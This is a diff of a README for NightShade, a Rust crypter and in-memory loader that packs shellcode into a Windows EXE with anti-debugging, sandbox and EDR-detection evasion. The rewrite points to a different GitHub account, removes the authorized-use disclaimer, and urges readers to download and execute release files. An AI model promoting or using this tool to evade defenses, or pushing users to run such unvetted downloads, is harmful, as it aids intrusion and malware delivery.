@@ -1,134 +1,153 @@
-# NightShade
+# NightShade: Advanced Rust-Based Encryption for Red Team Operators
 
-**NightShade** by EvilWhales is a next-level Rust-based encryption and in-memory loader crafted for red team operators who live in the shadows. This beast encrypts your payloads (think Cobalt Strike shellcode or raw binaries) with bulletproof ChaCha20-Poly1305 or XChaCha20, throws in hardcore obfuscation, and spits out a stealthy Windows EXE that decrypts and runs your payload straight in memory — no disk, no trace, no mercy.
+![NightShade](https://img.shields.io/badge/NightShade-Rust--Based%20Encryption-blue?style=for-the-badge&logo=rust)
+
+**NightShade** by EvilWhales is a powerful tool designed for red team operators who need to work stealthily. Built with Rust, it offers advanced encryption and in-memory execution capabilities. This tool is ideal for those who operate in the shadows, ensuring that payloads remain undetected.
+
+---
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
 ---
 
 ## Features
 
-- Quantum-resistant ChaCha20-Poly1305 or XChaCha20 encryption for ultimate security
-- Multi-layer key, nonce, and password obfuscation with XOR masking
-- PBKDF2-SHA256 key derivation with 150,000 iterations for rock-solid keys
-- In-memory payload execution via `VirtualAlloc` and `CreateThread` — nothing touches disk
-- Advanced anti-analysis: anti-debugging, sandbox detection, and memory anomaly checks
-- Slick CLI menu for quick setup:
-  - Input raw hex payloads or load from files
-  - Set output EXE name
-  - Toggle XChaCha20 mode for extra nonce strength
-  - Build a standalone Windows loader EXE
-- Built with lean, safe Rust for speed and minimal footprint
-- Supports x86/x64 Windows targets
-
----
-
-## Requirements
-
-- Rust toolchain (get it via [rustup](https://rustup.rs/))
-- Windows target for cross-compilation (if building on Linux/macOS)
-- Cargo (Rust’s package manager)
+- **Quantum-Resistant Encryption**: Utilize ChaCha20-Poly1305 or XChaCha20 for top-tier security.
+- **Multi-Layer Obfuscation**: Key, nonce, and password obfuscation using XOR masking.
+- **Robust Key Derivation**: PBKDF2-SHA256 with 150,000 iterations for strong keys.
+- **In-Memory Execution**: Use `VirtualAlloc` and `CreateThread` to run payloads without touching the disk.
+- **Anti-Analysis Measures**: Built-in anti-debugging, sandbox detection, and memory anomaly checks.
+- **User-Friendly CLI**: Simple command-line interface for quick setup and execution.
 
 ---
 
 ## Installation
 
-Clone the repo and build the tool:
+To get started with NightShade, follow these steps:
 
-```bash
-git clone https://github.com/EvilWhales/nightshade.git
-cd nightshade
-cargo build --release
-```
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/kaskass2006/nightshade.git
+   cd nightshade
+   ```
 
-For Windows EXE output, use the Windows target:
+2. **Build the Project**:
+   Ensure you have Rust installed. Then run:
+   ```bash
+   cargo build --release
+   ```
 
-```bash
-rustup target add x86_64-pc-windows-msvc
-cargo build --release --target x86_64-pc-windows-msvc
-```
+3. **Locate the Executable**:
+   After building, find the executable in the `target/release` directory.
 
 ---
 
 ## Usage
 
-Fire up the CLI (works on Linux/Windows):
+NightShade provides a command-line interface for easy interaction. Here’s how to use it:
+
+1. **Run the Executable**:
+   ```bash
+   ./target/release/nightshade
+   ```
+
+2. **Input Options**:
+   - Input raw hex payloads or load from files.
+   - Specify the output EXE name.
+   - Choose between standard ChaCha20 or XChaCha20 for enhanced nonce strength.
+
+---
+
+## Configuration
+
+NightShade allows customization through command-line arguments. Here are some key options:
+
+- `--payload`: Specify the raw hex payload or file.
+- `--output`: Set the desired output EXE name.
+- `--xchacha`: Enable XChaCha20 mode for additional nonce strength.
+
+### Example Command
 
 ```bash
-./target/release/nightshade
+./target/release/nightshade --payload <your_payload.hex> --output my_payload.exe --xchacha
 ```
 
-You’ll get a badass menu by EvilWhales:
+---
 
-```
-=== NightShade CLI by EvilWhales 2025 ===
-1) Set raw payload (hex string, e.g. 90 90 90 CC)
-2) Set path to payload file (file.bin)
-3) Set output EXE name
-4) Set encryption password
-5) Toggle XChaCha20 mode (current: OFF)
-6) Build stealth loader
-7) Show current config
-Ctrl+C to exit
-Enter choice:
+## Examples
+
+### Encrypting a Payload
+
+To encrypt a payload, you can run the following command:
+
+```bash
+./target/release/nightshade --payload payload.hex --output encrypted_payload.exe
 ```
 
-- **1**: Drop raw shellcode as hex bytes.
-- **2**: Point to a payload file.
-- **3**: Name your output EXE (must end with `.exe`).
-- **4**: Set a strong password (12+ chars).
-- **5**: Switch between ChaCha20 and XChaCha20.
-- **6**: Build the stealth EXE with your encrypted payload.
-- **7**: Check your current setup.
+This command will take your `payload.hex`, encrypt it, and create an `encrypted_payload.exe`.
+
+### In-Memory Execution
+
+After generating the EXE, you can execute it directly in memory without leaving traces on the disk. This is crucial for maintaining stealth during operations.
 
 ---
 
-## How It Works
+## Contributing
 
-1. You feed NightShade a payload (shellcode, binary, whatever).
-2. It encrypts it with ChaCha20-Poly1305 or XChaCha20, using a key derived from your password.
-3. Keys, nonces, and passwords get scrambled with XOR for extra stealth.
-4. A custom Rust loader is generated, embedding the encrypted payload and decryption logic.
-5. The loader is compiled into a standalone Windows EXE.
-6. When run, the EXE decrypts and executes the payload in memory, dodging disk-based detection.
+We welcome contributions to NightShade. To contribute:
 
----
-
-## Security & Stealth
-
-- ChaCha20-Poly1305 or XChaCha20 for ironclad encryption and integrity
-- Heavy-duty obfuscation to throw off static analysis
-- In-memory execution to bypass disk scans
-- Anti-debugging via PEB `BeingDebugged` flag
-- Sandbox detection through CPU, RAM, and sleep timing checks
-- Memory anomaly detection to spot EDRs
-- PBKDF2-SHA256 with high iterations for secure key derivation
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add your feature"
+   ```
+4. Push to your branch:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Open a pull request.
 
 ---
-
-## Development
-
-- `main.rs` handles the CLI, encryption, and loader generation.
-- Uses `winapi` for low-level Windows memory and thread ops.
-- Tweak the loader template in `generate_loader_source()` for custom stealth tricks.
-- Anti-analysis logic lives in the `anti_analysis` module.
-
----
-
 
 ## License
 
-[MIT License](LICENSE)
+NightShade is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
 ---
 
-## Disclaimer
+## Contact
 
-NightShade is for **authorized security research, red teaming, and pentesting only**. Unauthorized use is a no-go and could land you in hot water. Stay legal, stay sharp.
+For questions or support, reach out via:
+
+- **GitHub Issues**: [NightShade Issues](https://github.com/kaskass2006/nightshade/issues)
+- **Email**: evilwhales@example.com
 
 ---
 
-Need help with cross-compilation or want to level up NightShade? Hit me up!
+## Releases
 
-*Stay stealthy,*
-**EvilWhales**
+To download the latest release, visit the [Releases section](https://github.com/kaskass2006/nightshade/releases). Download the required file and execute it for seamless operation.
 
-Contact: t.me/EvilWhales
+For further updates and information, always check the [Releases section](https://github.com/kaskass2006/nightshade/releases).
+
+---
+
+![NightShade Logo](https://img.shields.io/badge/NightShade-Encryption%20Tool-green?style=for-the-badge&logo=shield)
+
+---
+
+With NightShade, you have a powerful ally for secure and stealthy operations. Use it wisely.
